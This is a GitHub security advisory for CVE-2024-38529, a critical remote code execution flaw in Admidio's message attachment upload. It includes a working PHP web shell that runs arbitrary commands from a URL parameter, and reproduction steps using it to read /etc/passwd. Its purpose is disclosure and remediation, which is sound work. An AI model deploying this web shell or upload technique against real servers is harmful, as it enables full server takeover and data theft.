# [C] Admidio Vulnerable to RCE via Arbitrary File Upload in Message Attachment

## Summary
Severity: Critical
Advisory: GHSA-g872-jwwr-vggm
CVE: CVE-2024-38529
CWE: CWE-434
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2024-07-29
Source: https://github.com/advisories/GHSA-g872-jwwr-vggm
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <4.3.10

## Details
### Description:
Remote Code Execution Vulnerability has been identified in the Message module of the Admidio Application, where it is possible to upload a PHP file in the attachment. The uploaded file can be accessed publicly through the URL `{admidio_base_url}/adm_my_files/messages_attachments/{file_name}`.

The vulnerability is caused due to the lack of file extension verification, allowing malicious files to be uploaded to the server and public availability of the uploaded file.

An attacker can upload a PHP web shell that executes OS commands on the server, compromising the application server.

Note: I am using the docker-compose.yaml file from https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage official documentation.

### Impact:
An attacker can exploit this flaw to upload a PHP web shell, which can be used to execute arbitrary commands on the server. This can lead to a complete compromise of the application server, allowing the attacker to:

- Execute arbitrary code or commands.
- Access, modify, or delete sensitive data.
- Install malicious software or scripts.
- Gain further access to internal networks.
- Disrupt services and applications hosted on the server.

### Recommendation:

- Implement strict file extension verification to ensure that only allowed file types (e.g., images, documents) can be uploaded.
- Reject any file upload with disallowed or suspicious extensions such as .php, .phtml, .exe, etc.

### Steps to Reproduce:
1. As a member user, go to write an email message.
2. Upload a PHP file in the Attachment, containing the following content:
```
<?php
$command = isset($_GET['command']) ? $_GET['command'] : '';
$output = [];
$return_var = 0;
exec($command, $output, $return_var);
echo '<h1>Exploiting RCE</h1>';
echo 'Command: '.$command;
echo '\n<pre>';
echo implode("\n", $output);
echo '</pre>';
?>
```
3. Send the email.
4. In the message history go to the sent message.
5. Download the file, to get the uploaded file name.
6. Go to the following URL: 
`{admidio_base_url}/adm_my_files/messages_attachments/{file_name}?command=cat+/etc/passwd`
7. The server's passwd file would be returned in the response.

### Proof Of Concept:

![image](https://github.com/Admidio/admidio/assets/59286712/51b524de-ec51-4875-80e9-e2037da9c573)

_Figure 1: Code of messages_send.php, not having file extension verification._

![image](https://github.com/Admidio/admidio/assets/59286712/74b47e6d-e2e9-4535-82e3-d6ad2f677361)

_Figure 2: Uploading Webshell as attachment._

![image](https://github.com/Admidio/admidio/assets/59286712/abea26eb-b36f-46db-9e3a-8a4ba82d9740)

_Figure 3: Download the uploaded file to get the uploaded file name._

![image](https://github.com/Admidio/admidio/assets/59286712/fbb14aae-d5c6-454b-bafa-8d03d6d8a208)

_Figure 4: Uploaded File name._

![image](https://github.com/Admidio/admidio/assets/59286712/f8436248-1768-4714-ad2d-87f157145c61)

_Figure 5: RCE via web shell._

![image](https://github.com/Admidio/admidio/assets/59286712/edc5b992-227f-43f9-bef9-87959766a63c)

_Figure 6: RCE via Webshell._

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-g872-jwwr-vggm
- https://nvd.nist.gov/vuln/detail/CVE-2024-38529
- https://github.com/Admidio/admidio/commit/3b1cc1cda05747edebe15f2825b79bc5a673d94c
- https://github.com/Admidio/admidio
